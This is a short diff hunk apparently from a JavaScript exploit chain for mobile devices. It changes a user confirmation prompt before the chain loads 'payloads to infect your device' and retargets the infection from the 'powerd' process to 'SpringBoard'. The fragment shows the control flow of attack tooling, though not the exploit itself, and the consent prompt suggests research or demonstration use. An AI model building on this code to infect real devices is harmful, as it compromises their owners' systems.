@@ -1248,7 +1248,7 @@ function YA() {/* Original: YA → resolveSymbols */
                     // When we load the metadata, ask user if they want to continue (will infect device)
                     if (hashName === "7a7d99099b035b2c6512b6ebeeea6df1ede70fbb") {
                         let shouldContinue = confirm(
-                            "The script is about to load metadata and subsequent payloads to infect your device in `powerd` process.\n" +
+                            "The script is about to load metadata and subsequent payloads to infect your device in `SpringBoard` process.\n" +
                             "Cancel = safely STOP this operation\n" +
                             "OK     = continue infect your device");
                         if (!shouldContinue) {
